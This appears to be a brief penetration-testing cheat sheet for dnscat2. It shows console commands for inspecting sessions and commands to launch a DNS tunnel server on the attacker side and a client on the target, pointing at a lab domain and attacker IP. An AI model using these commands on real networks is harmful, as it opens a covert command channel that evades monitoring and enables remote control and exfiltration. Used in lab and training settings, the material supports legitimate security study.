## Inspect established dnscat2 sessions

**Run in:** Inside the dnscat2 server console. **Requires:** A running dnscat2 server and a client session whose numeric ID is taken from windows output; DNS routing/delegation must already be configured.

```bash
windows
window -i SESSION_ID
```

**What the result establishes:** Verify the DNS query path and established session, then check the specific forwarded service separately.

**Next check:** Check the selected window type and DNS path, then use that command window's supported operations; a DNS exchange alone is not a working tunnel.

### dnscat2: DNS Tunnel Quick Reference

**dnscat2: DNS Tunnel Quick Reference**

```bash
# server (attacker) — needs a domain delegated to you, or direct mode
dnscat2-server inlanefreight.local
# client (target)
./dnscat --secret=<secret> inlanefreight.local        # via DNS hierarchy
./dnscat --dns server=10.10.14.18,port=53 --secret=<secret>   # direct
```
